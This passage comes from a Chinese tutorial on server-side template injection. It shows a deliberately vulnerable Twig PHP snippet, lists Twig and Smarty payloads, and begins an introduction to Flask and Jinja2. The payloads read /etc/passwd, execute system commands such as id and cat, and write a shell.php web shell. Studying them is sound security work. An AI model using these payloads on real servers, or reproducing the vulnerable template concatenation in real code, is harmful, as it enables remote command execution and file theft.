&lt;p&gt;也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击:&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20200815170919414-672456065.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;但是，如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;　　require_once dirname(__FILE__).&amp;#x27;/../lib/Twig/Autoloader.php&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;　　Twig_Autoloader::register(true);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;　　$twig=newTwig_Environment(newTwig_Loader_String());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;　　$output=$twig-&amp;gt;render(&amp;quot;Hello &amp;#123;$_GET[&amp;#x27;name&amp;#x27;]&amp;#125;&amp;quot;);// 将用户输入作为模版内容的一部分&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;　　echo $output;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见:&lt;/p&gt;
&lt;p&gt;如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。&lt;/p&gt;
&lt;p&gt;在 Twig 模板引擎里，， 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值。&lt;/p&gt;
&lt;p&gt;例如这里用户输入 name=20 ，则在服务端拼接的模版内容为:&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20200815171519739-387170199.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;以上使用的 twig 为 2.x 版本，现在官方已经更新到 3.x 版本，根据官方文档新增了 filter 和 map 等内容，补充一些新版本的 payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;&amp;#x27;/etc/passwd&amp;#x27;|file_excerpt(1,30)&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;app.request.files.get(1).__construct(&amp;#x27;/etc/passwd&amp;#x27;,&amp;#x27;&amp;#x27;)&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;app.request.files.get(1).openFile.fread(99)&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;_self.env.registerUndefinedFilterCallback(&amp;quot;exec&amp;quot;)&amp;#125;&amp;#125;&amp;#123;&amp;#123;_self.env.getFilter(&amp;quot;whoami&amp;quot;)&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;_self.env.enableDebug()&amp;#125;&amp;#125;&amp;#123;&amp;#123;_self.env.isDebug()&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;[&amp;quot;id&amp;quot;]|map(&amp;quot;system&amp;quot;)|join(&amp;quot;,&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;&amp;#123;&amp;quot;&amp;lt;?php phpinfo();&amp;quot;:&amp;quot;/var/www/html/shell.php&amp;quot;&amp;#125;|map(&amp;quot;file_put_contents&amp;quot;)&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;[&amp;quot;id&amp;quot;,0]|sort(&amp;quot;system&amp;quot;)|join(&amp;quot;,&amp;quot;)&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;[&amp;quot;id&amp;quot;]|filter(&amp;quot;system&amp;quot;)|join(&amp;quot;,&amp;quot;)&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;[0,0]|reduce(&amp;quot;system&amp;quot;,&amp;quot;id&amp;quot;)|join(&amp;quot;,&amp;quot;)&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;[&amp;#x27;cat /etc/passwd&amp;#x27;]|filter(&amp;#x27;system&amp;#x27;)&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;smarty&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#smarty&#34;&gt;#&lt;/a&gt; smarty&lt;/h3&gt;
&lt;p&gt;Smarty 是最流行的 PHP 模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数 (相当于存在了一个 disable_function)&lt;/p&gt;
&lt;p&gt;$smarty 内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法&lt;/p&gt;
&lt;p&gt;注入点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;XFF&lt;/li&gt;
&lt;li&gt;Client IP&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;$smarty.version&amp;#125;  #获取smarty的版本号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;php&amp;#125;phpinfo();&amp;#123;/php&amp;#125;  #执行相应的php代码,在Smarty3版本中已经废弃&amp;#123;php&amp;#125;标签，强烈建议不要使用。在Smarty 3.1，&amp;#123;php&amp;#125;仅在SmartyBC中可用。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;phpinfo();&amp;lt;/script&amp;gt;    #&amp;lt;script language=&amp;quot;php&amp;quot;&amp;gt;phpinfo();&amp;lt;/script&amp;gt; ,只适用于php5,原理是&amp;#123;literal&amp;#125;标签&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;self::getStreamVariable(&amp;quot;file:///etc/passwd&amp;quot;)&amp;#125;  #在3.1.30的Smarty版本中官方已经把该静态方法删除&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;if phpinfo()&amp;#125;&amp;#123;/if&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;python&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#python&#34;&gt;#&lt;/a&gt; python&lt;/h2&gt;
&lt;h3 id=&#34;flaskjinja2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#flaskjinja2&#34;&gt;#&lt;/a&gt; Flask&amp;amp;jinja2&lt;/h3&gt;
&lt;p&gt;这里先补充一些 flask 的知识&lt;/p&gt;
&lt;p&gt;我们有如下代码&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from flask import Flask&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;app = Flask(__name__)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@app.route(&amp;quot;/&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def hello_world():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return &amp;quot;hello world&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if __name__ == &amp;#x27;__main__&amp;#x27;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    app.run()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果没有 flask 报错就自己去 pip3 install&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203102807012.png&#34; alt=&#34;image-20221203102807012&#34;&gt;&lt;/p&gt;
&lt;p&gt;此时可以在 web 上运行 hello world 了，访问&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEyNy4wLjAuMTo1MDAwLw==&#34;&gt; http://127.0.0.1:5000&lt;/span&gt; 便可以看到打印出 Hello World&lt;/p&gt;
&lt;h4 id=&#34;route&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#route&#34;&gt;#&lt;/a&gt; route&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@app.route(&amp;#x27;/&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用 route（）装饰器告诉 Flask 什么样的 URL 能触发我们的函数&lt;/p&gt;
&lt;p&gt;route（）装饰器把一个函数绑定到对应的 URL 上，这句话相当于路由，一个路由跟随一个函数，如&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@app.route(&amp;#x27;/&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def test()&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   return 123&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;访问 127.0.0.1:5000 / 则会输出 123，我们修改一下规则&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@app.route(&amp;#x27;/test&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def test()&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   return 123&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个时候访问 127.0.0.1:5000/test 会输出 123.&lt;/p&gt;
&lt;p&gt;此外还可以设置动态网址，&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@app.route(&amp;quot;/hello/&amp;lt;username&amp;gt;&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def hello_user(username):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return &amp;quot;user:%s&amp;quot;%username&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;根据 url 里的输入，动态辨别身份，此时便可以看到如下页面：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203103046869.png&#34; alt=&#34;image-20221203103046869&#34;&gt;&lt;/p&gt;
&lt;p&gt;或者可以使用 int 型，转换器有下面几种：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int    接受整数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;float    同 int ，但是接受浮点数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;path    和默认的相似，但也接受斜线&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@app.route(&amp;#x27;/post/&amp;lt;int:post_id&amp;gt;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def show_post(post_id):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    # show the post with the given id, the id is an integer&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return &amp;#x27;Post %d&amp;#x27; % post_id&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;app.run(debug=True)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这样我们修改代码的时候直接保存，网页刷新就可以了，如果不加 debug，那么每次修改代码都要运行一次程序，并且把前一个程序关闭。否则会被前一个程序覆盖。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;app.run(host=&amp;#x27;0.0.0.0&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这会让操作系统监听所有公网 IP, 此时便可以在公网上看到自己的 web。&lt;/p&gt;
&lt;h4 id=&#34;模板渲染&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#模板渲染&#34;&gt;#&lt;/a&gt; 模板渲染&lt;/h4&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from flask import render_template&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@app.route(&amp;#x27;/hello/&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@app.route(&amp;#x27;/hello/&amp;lt;name&amp;gt;&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def hello(name=None):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        return render_template(&amp;#x27;hello.html&amp;#x27;, name=name)//我们hello.html模板未创建所以&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;模板渲染体系，render_template 函数渲染的是 templates 中的模板，所谓模板是我们自己写的 html，里面的参数需要我们根据每个用户需求传入动态变量。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;├── app.py  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;├── static  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;│   └── style.css  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;└── templates  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    └── index.html&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们写一个 index.html 文件写 templates 文件夹中。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;title&amp;gt;&amp;#123;&amp;#123;title&amp;#125;&amp;#125; - 小猪佩奇&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;h1&amp;gt;Hello, &amp;#123;&amp;#123;user.name&amp;#125;&amp;#125;!&amp;lt;/h1&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们在 app.py 文件里进行渲染。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@app.route(&amp;#x27;/&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;@app.route(&amp;#x27;/index&amp;#x27;)#我们访问/或者/index都会跳转&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def index():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   user = &amp;#123;&amp;#x27;name&amp;#x27;: &amp;#x27;小猪佩奇&amp;#x27;&amp;#125;#传入一个字典数组&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   return render_template(&amp;quot;index.html&amp;quot;,title=&amp;#x27;Home&amp;#x27;,user=user)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这次渲染我们没有使用用户可控，所以是安全的，如果我们交给用户可控并且不过滤参数就有可能造成 SSTI 模板注入漏洞。&lt;/p&gt;
&lt;p&gt;渲染的方法有 &lt;code&gt;render_template&lt;/code&gt;  和 &lt;code&gt;render_template_string&lt;/code&gt;  两种。&lt;/p&gt;
&lt;p&gt;render_template () 是用来渲染一个指定的文件的&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; render_template(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index.html&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;render_template_string 则是用来渲染一个字符串的&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;html = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;h1&amp;gt;This is index page&amp;lt;/h1&amp;gt;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; render_template_string(html)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
